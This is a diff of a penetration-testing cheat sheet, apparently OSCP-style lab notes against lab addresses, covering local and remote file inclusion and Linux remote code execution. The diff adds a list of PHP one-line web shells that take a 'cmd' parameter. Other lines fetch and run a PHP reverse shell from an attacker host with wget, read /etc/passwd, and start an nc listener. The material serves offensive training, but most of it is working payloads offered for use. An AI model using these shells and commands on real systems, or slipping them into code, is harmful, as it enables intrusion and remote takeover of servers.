@@ -234,12 +234,14 @@ http://10.11.1.71:80/cgi-bin/admin.cgi
 ````
 http://10.11.1.35/section.php?page=/etc/passwd
 ````
-<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="350" height="270" />
+<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="480" height="250" />
+
 ### Remote File Inclusion
 ````
 http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
 ````
-<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="350" height="270" />
+
+<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="480" height="250" />
 
 ### Command Injection
 #### DNS Querying Service
@@ -387,18 +389,25 @@ setup listner and webserver
 ### Linux rce techniques
 ````
 cp /usr/share/webshells/php/php-reverse-shell.php .
+mv php-reverse-shell.php shell.php
 python3 -m http.server
 nc -nlvp 443
 <?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
 ````
 ````
-<?php shell_exec($_GET['cmd']);?> #&cmd=whoami or ?cmd=whoami
+ &cmd=whoami or ?cmd=whoami
+<?php shell_exec($_GET["cmd"]);?>
+<?php system($_GET["cmd"]);?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 ````
 ````
 cp /usr/share/webshells/php/php-reverse-shell.php .
 python3 -m http.server 800
 nc -nlvp 443
-<?php system($_GET['cmd']);?> #&cmd=whoami or ?cmd=whoami
 &cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
 ````
 #### Chaining exploits
